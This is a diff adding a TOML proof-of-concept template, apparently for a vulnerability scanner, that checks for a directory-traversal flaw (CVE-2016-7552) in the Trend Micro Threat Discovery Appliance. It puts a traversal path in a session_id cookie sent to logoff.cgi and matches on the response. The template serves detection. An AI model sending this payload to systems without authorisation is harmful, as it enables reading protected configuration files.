@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "通过向 /cgi-bin/logoff.cgi 发送包含目录遍历序列 session_id Cookie 的 GET 请求，检测目标是否存在目录遍历漏洞。若响应状态码 200 且响应体包含 Memory map 字符串，则判定存在漏洞。"
+id = "POC-AVE-2016-0070"
+name = "Trend Micro Threat Discovery Appliance 目录遍历漏洞 PoC"
+severity = "critical"
+tags = ["ave-2016-0070"]
+vuln_id = [
+    "CVE-2016-7552",
+    "AVE-2016-0070",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/logoff.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Cookie = "session_id=../../../opt/TrendMicro/MinorityReport/etc/igsa.conf"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Memory map"]
